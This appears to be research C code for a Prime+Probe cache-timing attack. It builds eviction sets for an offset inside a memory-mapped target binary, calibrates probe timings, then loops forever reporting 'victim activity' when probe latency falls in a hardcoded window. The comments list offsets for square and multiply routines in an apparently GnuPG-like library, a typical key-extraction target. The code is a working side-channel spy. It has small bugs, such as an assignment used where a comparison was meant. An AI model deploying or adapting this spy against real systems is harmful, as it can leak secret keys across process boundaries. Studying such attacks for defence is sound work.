#include "evset-timings.c"
#include <sys/stat.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <x86intrin.h>
#include <errno.h>

static Node **spy_evsets = NULL;
static void *victim;
static void *victim_copy;
// static int map_len;
uint64_t *msrmts_spy;

void *map(char *file_name, uint64_t offset)
{
    int file_descriptor = open(file_name, O_RDONLY); 
    if (file_descriptor == -1) return NULL;
    struct stat st_buf;
    if (fstat(file_descriptor, &st_buf) == -1) return NULL;
    size_t map_len = st_buf.st_size;
    printf("debug size map_len %d\n", map_len);
	void *mapping = mmap(NULL, map_len, PROT_READ, MAP_SHARED, file_descriptor, 0);
	if (mapping == MAP_FAILED){
		printf("[!] map: mmap fail with errno %d\n", errno); // fix problems with mmap
		return NULL;
	}
	close(file_descriptor);
	return (void *)(((uint64_t) mapping) + offset);  // mapping will be implicitly unmapped when calling function will be exited
}

// TODO load addresses from file

void init_spy(char *target_filepath, int offset_target){
    printf("[+] spy: init spy\n");
    // load victim 
    // victim_reader(target_filepath);
    victim = map(target_filepath, offset_target);
    victim_copy = map(target_filepath, offset_target);
    // printf("victim read\n");

    // prepare evset
    // Config *spy_conf= config_init(16, 2048, 64, 106, 2097152, 1, 1);
    Config *spy_conf= config_init(16, 2048, 64, 106, 2097152, 1, 1);
    init_evset(spy_conf);
    printf("[+] spy: init evset done\n");
    spy_evsets = find_evset(spy_conf, victim);
    printf("[+] spy: find evset done\n");
    
    printf("[+] spy: print spy evset for target adrs %p\n", victim);
    list_print(spy_evsets);

    msrmts_spy = malloc(1000000*sizeof(uint64_t));
}

static __inline__ unsigned long long rdtsc(void)
{
    unsigned long long int x;
    __asm__ __volatile__ ("rdtsc" : "=A" (x));
    return x;
}

uint64_t findMin(const uint64_t *array, size_t n) {
    // Handle empty array case
    if (n == 0) return 0; // Or any other appropriate value

    uint64_t min = array[0];
    for (size_t i = 1; i < n; ++i) if (array[i] < min) min = array[i];
    return min;
}

uint64_t findMax(const uint64_t *array, size_t n) {
    // Handle empty array case
    if (n == 0) return 0; // Or any other appropriate value  
    
    uint64_t max = array[0];
    for (size_t i = 1; i < n; ++i) if (array[i] > max) max = array[i];
    return max;
}

#define REPS_NO 100000
void my_monitor(){
    int ctr =0, evset_probetime;
    unsigned long long old_tsc, tsc = rdtsc();

    wait(1E9);
    probe_evset_chase_once(*spy_evsets);
    for(int i=0;i<REPS_NO;i++) msrmts_spy[i] = probe_evset_chase_once(*spy_evsets);
    for(int i=0;i<100;i++) printf("%lu; ", msrmts_spy[i]);
    for(int i=REPS_NO/2;i<REPS_NO/2+100;i++) printf("%lu; ", msrmts_spy[i]);
    printf("\n");
    printf("no access, min %lu, max %lu , median %lu\n", findMin(msrmts_spy, REPS_NO), findMax(msrmts_spy, REPS_NO), median_uint64(msrmts_spy, REPS_NO));

    for(int i=0;i<REPS_NO;i++) {
        asm __inline__("mfence;");
        probe_chase_loop(victim, 1);
        msrmts_spy[i] = probe_evset_chase_once(*spy_evsets);
    }
    for(int i=0;i<100;i++) printf("%lu; ", msrmts_spy[i]);
    for(int i=REPS_NO/2;i<REPS_NO/2+100;i++) printf("%lu; ", msrmts_spy[i]);
    printf("\n");
    printf("access, min %lu, max %lu , median %lu\n", findMin(msrmts_spy, REPS_NO), findMax(msrmts_spy, REPS_NO), median_uint64(msrmts_spy, REPS_NO));



    probe_evset_chase_once(*spy_evsets);
    for(int i=0;i<REPS_NO;i++) msrmts_spy[i] = probe_evset_chase_once(*spy_evsets);
    for(int i=0;i<100;i++) printf("%lu; ", msrmts_spy[i]);
    for(int i=REPS_NO/2;i<REPS_NO/2+100;i++) printf("%lu; ", msrmts_spy[i]);
    printf("\n");
    printf("no access, min %lu, max %lu , median %lu\n", findMin(msrmts_spy, REPS_NO), findMax(msrmts_spy, REPS_NO), median_uint64(msrmts_spy, REPS_NO));


    probe_evset_chase(*spy_evsets);
    probe_evset_chase(*spy_evsets);
    // printf("b\n");
    int positive=0;
    while(1)
    {
        // positive=0;
        old_tsc = tsc;
        tsc=rdtsc();
        while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
        {
            tsc = rdtsc();
        }
        // probe_evset_chase(*spy_evsets);
        msrmts_spy[ctr] = probe_evset_chase_once(*spy_evsets);
        if(msrmts_spy[ctr] > 890 && msrmts_spy[ctr] < 1150) { // hardcoded evset threshold
            if(positive =1) printf("[!] my_monitor: victim acitivity detected! cycles %lu, ctr %d\n", msrmts_spy[ctr], ctr);
            // positive=1;
            // break;
        }
        probe_evset_chase(*spy_evsets);
        probe_evset_chase(*spy_evsets);
        probe_evset_chase(*spy_evsets);
        probe_evset_chase(*spy_evsets);
        probe_evset_chase(*spy_evsets);
        probe_evset_chase(*spy_evsets);
        ctr++;
        if(ctr >= 1000000) ctr=0;
    }
    
    // for(int i=0;i<20;i++) printf("%lu; ", msrmts_spy[i]);
    // printf("\n ctr %d \n", ctr);
}

void spy(char *victim_filepath, int offset_target){
    init_spy(victim_filepath, offset_target);
    printf("[+] spy: spy init complete, monitoring %p now...\n", victim);
    my_monitor();
}

int main(int ac, char **av){  
    // printf("%s\n", av[1]); // first char file path
    // printf("%s\n", av[2]); // second file path later, rn hardcoded location 
    // int my_target = 0x15cb;
    if(ac!=3) return 0;
    // int my_target = 0xd57ed; 
    int my_target = 0x118a;
    //0x116f-0x11b4 victim_loop2, loop itself 0x118a - 0x11a8, take 0x118a alder lake
    //0xd57ed madgpg sqr, 0xd571f mul
    // loop2 skylake 0x118a
    // my_access(my_target);
    // printf("%d\n", my_target);
    // printf("%p\n", target_loader(av[2]));
    spy(av[1], my_target);
}

//TODO warum 400 cycles in test, aber 1900 hier bei evset probe
// evtl target im L2 cache ?? was ist mit L1 timing? was mach ich dann?